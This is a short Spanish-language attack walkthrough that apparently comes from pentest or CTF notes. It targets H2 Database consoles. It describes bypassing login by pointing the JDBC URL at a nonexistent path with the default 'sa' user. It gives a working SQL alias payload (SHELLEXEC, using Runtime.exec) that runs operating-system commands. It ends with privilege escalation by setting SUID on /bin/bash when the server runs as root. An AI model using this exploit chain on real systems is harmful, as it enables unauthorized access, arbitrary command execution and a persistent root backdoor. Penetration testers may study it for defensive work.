# H2 Database Command Execution via JDBC URL Manipulation

**H2 Database** es un sistema de gestión de bases de datos relacional de código abierto, escrito en Java y diseñado para ser liviano y embebido en aplicaciones. Es ampliamente utilizado para pruebas, desarrollo y en entornos donde se requiere una base de datos rápida y de bajo consumo. Debido a su naturaleza flexible, en algunos casos puede quedar expuesto o mal configurado, permitiendo a un atacante ejecutar queries sin autenticación.

🚨 **Este ataque permite ejecutar comandos en el sistema operativo a través de la ejecución de queries en H2 Database sin necesidad de autenticarse.** 🚨

## Procedimiento

### 1. Manipulación del Parámetro JDBC URL
Al acceder al panel de inicio de sesión de H2 Database, podemos modificar el parámetro **JDBC URL** a una ruta que no exista. Esto nos permite omitir la autenticación, utilizando el usuario predeterminado **sa** sin contraseña.

### 2. Creación de un Alias para Ejecución de Comandos
Una vez logrado el acceso, se puede ejecutar una query para crear un alias que permita la ejecución de comandos del sistema. El siguiente comando crea un alias llamado **SHELLEXEC**:

```mysql
CREATE ALIAS SHELLEXEC AS $$ 
String shellexec(String cmd) throws java.io.IOException { 
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); 
    return s.hasNext() ? s.next() : "";  
}$$;
```

### 3. Ejecución de Comandos
Con el alias creado, podemos ejecutar comandos en el sistema operativo. Por ejemplo, para ejecutar el comando `id` y obtener información sobre el usuario del sistema:

```mysql
CALL SHELLEXEC('id')
```

### 4. Escalada de Privilegios (si H2 Database se ejecuta como ROOT)
Si el servidor H2 Database está corriendo con privilegios de **ROOT**, se puede intentar escalar privilegios otorgando a **/bin/bash** permisos SUID. Esto se logra ejecutando:

```mysql
CALL SHELLEXEC('chmod 4755 /bin/bash')
```

Esta acción permite que cualquier usuario ejecute un shell con privilegios de ROOT.
```
